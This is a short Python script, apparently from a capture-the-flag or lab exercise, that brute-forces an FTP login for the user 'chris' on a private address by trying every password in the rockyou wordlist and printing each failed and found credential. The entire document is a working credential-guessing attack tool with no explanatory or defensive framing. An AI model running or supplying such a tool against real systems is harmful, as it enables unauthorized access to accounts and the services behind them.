#!/usr/bin/python

import ftplib

username = 'chris'
passwordfile = open("/usr/share/wordlists/rockyou.txt" , "r", encoding="utf-8", errors = "ignore")
passwords = passwordfile.readlines()
for password in passwords:
	try:
		brute = ftplib.FTP("10.10.21.125")
		brute.login(username, password.strip("\n"))
	except ftplib.error_perm as LoginError:
		print(f"[-] FAILED {username}:{password}")

	else:
		print(f"[+] FOUND {username}:{password}")
